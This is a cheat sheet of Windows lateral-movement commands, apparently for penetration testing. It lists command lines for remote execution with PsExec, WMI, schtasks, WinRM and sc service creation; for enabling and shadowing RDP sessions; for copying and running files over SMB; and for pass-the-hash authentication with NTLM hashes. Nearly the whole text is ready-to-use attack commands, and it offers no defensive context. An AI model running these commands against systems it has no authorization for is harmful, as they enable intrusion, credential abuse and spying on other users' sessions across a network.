# PsExec for Remote Command Execution

PsExec is a Sysinternals tool that can be used to execute commands remotely.

#### Execute Commands on a Remote System
```cmd
psexec \\<target_ip> -u <domain>\<user> -p <password> cmd
```

#### Execute Commands and Get Output Locally
```cmd
psexec \\<target_ip> -u <domain>\<user> -p <password> cmd /c "<command>"
```

#### Run a Program Remotely
```cmd
psexec \\<target_ip> -u <domain>\<user> -p <password> -c C:\path\to\program.exe
```

# Remote Desktop Protocol (RDP)

RDP allows for graphical remote desktop interaction, enabling lateral movement across machines.

#### Enable RDP on the Target System
```cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

#### Connect to the Remote Machine via RDP
```cmd
mstsc /v:<target_ip>
```

#### Shadow a Remote User Session (View Their Screen)
```cmd
shadow <session_id> /server:<target_ip>
```

# Windows Management Instrumentation (WMI)

WMI can be used for executing commands remotely on another machine.

#### Execute a Command on a Remote Host
```cmd
wmic /node:<target_ip> /user:<domain>\<user> /password:<password> process call create "cmd.exe /c <command>"
```

#### Query Information on a Remote Host
```cmd
wmic /node:<target_ip> /user:<domain>\<user> /password:<password> computersystem get name,domain
```

#### Start a Process Remotely
```cmd
wmic /node:<target_ip> /user:<domain>\<user> /password:<password> process call create "C:\path\to\program.exe"
```

# Remote Scheduled Tasks

Windows allows you to schedule tasks to run on remote machines, enabling command execution.

#### Create a Scheduled Task Remotely
```cmd
schtasks /create /s <target_ip> /u <domain>\<user> /p <password> /tn "TaskName" /tr "cmd.exe /c <command>" /sc once /st 00:00
```

#### Run a Scheduled Task Remotely
```cmd
schtasks /run /s <target_ip> /u <domain>\<user> /p <password> /tn "TaskName"
```

#### Delete a Scheduled Task Remotely
```cmd
schtasks /delete /s <target_ip> /u <domain>\<user> /p <password> /tn "TaskName" /f
```

# File Sharing (SMB)

Using SMB (Server Message Block) protocol, files can be transferred between hosts, and commands or payloads can be executed remotely.

#### List Shared Folders on a Remote System
```cmd
net view \\<target_ip>
```

#### Copy Files to a Remote Share
```cmd
copy <local_file> \\<target_ip>\C$\path\to\destination
```

#### Execute a File from a Remote Share
```cmd
psexec \\<target_ip> -u <domain>\<user> -p <password> cmd /c "\\<target_ip>\C$\path\to\file.exe"
```

# Pass-the-Hash

Pass-the-hash allows authentication using NTLM hashes instead of passwords.

#### Pass-the-Hash with PsExec
```cmd
psexec \\<target_ip> -u <domain>\<user> -h <NTLM_hash> cmd
```

#### Use `net use` to Authenticate Using an NTLM Hash
```cmd
net use \\<target_ip>\IPC$ /user:<domain>\<user> <NTLM_hash>
```

#### Use Pass-the-Hash to Connect via SMB
```cmd
wmic /node:<target_ip> /user:<domain>\<user> /password:<NTLM_hash> process call create "cmd.exe /c <command>"
```

# Remote PowerShell

#### Open a Remote PowerShell Session (If PowerShell Remoting is Enabled)
```cmd
Enter-PSSession -ComputerName <target_ip> -Credential <domain>\<user>
```

#### Run a PowerShell Script Remotely
```cmd
Invoke-Command -ComputerName <target_ip> -Credential <domain>\<user> -FilePath C:\path\to\script.ps1
```

# Windows Remote Management (WinRM)

WinRM is a service that allows remote management and command execution on Windows machines.

#### Check if WinRM is Enabled
```cmd
winrm quickconfig
```

#### Execute a Command on a Remote System via WinRM
```cmd
winrs -r:<target_ip> -u:<domain>\<user> -p:<password> cmd /c "<command>"
```

# Task Scheduler for Remote Execution

Task Scheduler can be used to run tasks on remote systems.

#### List Tasks on a Remote Machine
```cmd
schtasks /query /s <target_ip> /u <domain>\<user> /p <password>
```

#### Create and Run a Task on a Remote Machine
```cmd
schtasks /create /s <target_ip> /u <domain>\<user> /p <password> /tn "TaskName" /tr "cmd.exe /c <command>" /sc once /st 00:00
```

# Remote Service Creation

Windows services can be created or started remotely to execute payloads.

#### Create a Remote Service
```cmd
sc \\<target_ip> create <ServiceName> binpath= "C:\path\to\payload.exe" start= auto
```

#### Start a Remote Service
```cmd
sc \\<target_ip> start <ServiceName>
```
